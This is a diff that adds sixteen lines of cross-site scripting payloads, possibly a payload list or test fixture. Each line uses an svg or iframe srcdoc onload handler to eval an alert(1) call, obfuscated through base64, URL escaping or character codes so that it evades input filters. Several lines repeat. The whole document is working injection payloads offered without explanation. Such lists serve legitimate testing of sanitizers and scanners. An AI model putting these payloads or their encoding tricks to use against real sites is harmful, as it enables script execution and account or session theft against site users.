@@ -1,0 +1,16 @@
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%29"))'>
+<iframe srcdoc="<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<svg onload='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<iframe srcdoc="<body onload=eval(atob('YWxlcnQoMSk='))>">
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>">
+<svg onload='eval(atob("YWxlcnQoMSk="))'>
+<iframe srcdoc="<body onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>">
+<svg onload='eval(unescape("%61%6c%65%72%74%28%31%29"))'>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>">
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>
+<iframe srcdoc="<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>">
